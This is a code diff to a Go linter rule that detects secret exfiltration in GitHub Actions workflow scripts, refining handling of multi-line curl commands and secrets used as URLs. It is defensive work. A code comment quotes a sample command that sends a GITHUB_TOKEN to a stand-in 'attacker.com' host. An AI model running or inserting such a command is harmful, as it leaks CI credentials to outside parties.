@@ -300,6 +300,23 @@ func (rule *SecretExfiltrationRule) isLegitimateUse(script string) bool {
 	return false
 }
 
+// buildLogicalCommand joins a line and its shell line-continuation lines
+// (lines ending with '\') into a single logical command string.
+// This is used to check legitimate patterns even when the URL is on a
+// continuation line (e.g., curl -H "Auth: ${{ secrets.TOKEN }}" \
+//                               "https://api.github.com/...").
+func buildLogicalCommand(lines []string, startIdx int) string {
+	var parts []string
+	for i := startIdx; i < len(lines); i++ {
+		parts = append(parts, lines[i])
+		trimmed := strings.TrimRight(lines[i], " \t")
+		if !strings.HasSuffix(trimmed, "\\") {
+			break
+		}
+	}
+	return strings.Join(parts, " ")
+}
+
 // detectExfiltrationPatterns analyzes the script for exfiltration patterns
 func (rule *SecretExfiltrationRule) detectExfiltrationPatterns(script string, runStr *ast.String, envSecrets map[string]string) []exfiltrationPattern {
 	var patterns []exfiltrationPattern
@@ -309,7 +326,10 @@ func (rule *SecretExfiltrationRule) detectExfiltrationPatterns(script string, ru
 	lineOffset := 0
 
 	for lineIdx, line := range lines {
-		linePatterns := rule.analyzeLine(line, runStr, lineIdx, lineOffset, envSecrets)
+		// Build the logical command (joining shell line continuations) for
+		// legitimate pattern matching across multi-line curl commands.
+		logicalCmd := buildLogicalCommand(lines, lineIdx)
+		linePatterns := rule.analyzeLine(line, logicalCmd, runStr, lineIdx, lineOffset, envSecrets)
 		patterns = append(patterns, linePatterns...)
 		lineOffset += len(line) + 1 // +1 for newline
 	}
@@ -317,8 +337,70 @@ func (rule *SecretExfiltrationRule) detectExfiltrationPatterns(script string, ru
 	return patterns
 }
 
+// isSecretAsUrlArg returns true when the secret reference appears to be the
+// URL positional argument of a curl/wget command rather than the value of a
+// data/header flag.
+//
+// Example of a URL positional arg (should NOT flag):
+//
+//	curl -d "$PAYLOAD" ${{ secrets.DISCORD_WEBHOOK_URL }}
+//
+// Example of a flag value (SHOULD flag):
+//
+//	curl -H "Authorization: token ${{ secrets.GITHUB_TOKEN }}" attacker.com
+func (rule *SecretExfiltrationRule) isSecretAsUrlArg(line string, secretRef string, cmd networkCommand) bool {
+	if len(cmd.dataFlags) == 0 {
+		// Commands without data flags (nc, telnet, dig, etc.) don't have a
+		// distinct URL positional arg concept – always treat as exfiltration.
+		return false
+	}
+
+	secretIdx := strings.Index(line, secretRef)
+	if secretIdx == -1 {
+		return false
+	}
+
+	// The command must appear before the secret reference in the line.
+	cmdIdx := strings.Index(line, cmd.name)
+	if cmdIdx == -1 || cmdIdx >= secretIdx {
+		return false
+	}
+
+	// Examine the substring between the command occurrence and the secret.
+	between := line[cmdIdx+len(cmd.name) : secretIdx]
+
+	// Check whether any data flag's value is still open (unclosed quote) at
+	// the point where the secret appears.  If yes, the secret is inside a
+	// flag value and is being exfiltrated.
+	for _, flag := range cmd.dataFlags {
+		flagIdx := strings.LastIndex(between, flag)
+		if flagIdx == -1 {
+			continue
+		}
+		afterFlag := strings.TrimLeft(between[flagIdx+len(flag):], " \t=")
+		if afterFlag == "" {
+			// Flag appears immediately before the secret (unquoted flag value).
+			return false
+		}
+		if strings.HasPrefix(afterFlag, `"`) {
+			if !strings.Contains(afterFlag[1:], `"`) {
+				// Opening quote with no closing quote: secret is inside the flag value.
+				return false
+			}
+		} else if strings.HasPrefix(afterFlag, `'`) {
+			if !strings.Contains(afterFlag[1:], `'`) {
+				return false
+			}
+		}
+		// Otherwise the flag's value is fully closed; the secret is a
+		// separate (positional) argument.
+	}
+
+	return true // Secret appears to be the URL positional argument.
+}
+
 // analyzeLine analyzes a single line for exfiltration patterns
-func (rule *SecretExfiltrationRule) analyzeLine(line string, runStr *ast.String, lineIdx, lineOffset int, envSecrets map[string]string) []exfiltrationPattern {
+func (rule *SecretExfiltrationRule) analyzeLine(line string, logicalCmd string, runStr *ast.String, lineIdx, lineOffset int, envSecrets map[string]string) []exfiltrationPattern {
 	var patterns []exfiltrationPattern
 
 	// Skip comment lines
@@ -333,8 +415,9 @@ func (rule *SecretExfiltrationRule) analyzeLine(line string, runStr *ast.String,
 			continue
 		}
 
-		// Skip if line matches legitimate patterns for this command
-		if rule.matchesLegitPattern(line, cmd) {
+		// Skip if the logical command (including shell line continuations)
+		// matches a known-legitimate destination for this command.
+		if rule.matchesLegitPattern(logicalCmd, cmd) {
 			continue
 		}
 
@@ -342,6 +425,13 @@ func (rule *SecretExfiltrationRule) analyzeLine(line string, runStr *ast.String,
 		// Only detect if both the command and secret are on the same line
 		secretRefs := rule.findSecretRefsInLine(line)
 		for _, secretRef := range secretRefs {
+			// Skip secrets that appear to be the URL positional argument
+			// (not a data/header flag value).  Using a secret as the curl URL
+			// is a different threat model and is not "secret exfiltration".
+			if rule.isSecretAsUrlArg(line, secretRef, cmd) {
+				continue
+			}
+
 			pos := rule.calculatePosition(runStr, lineIdx, lineOffset, line, secretRef)
 			severity := "high"
 			if cmd.isHighRisk && rule.hasDataFlag(line, cmd) {
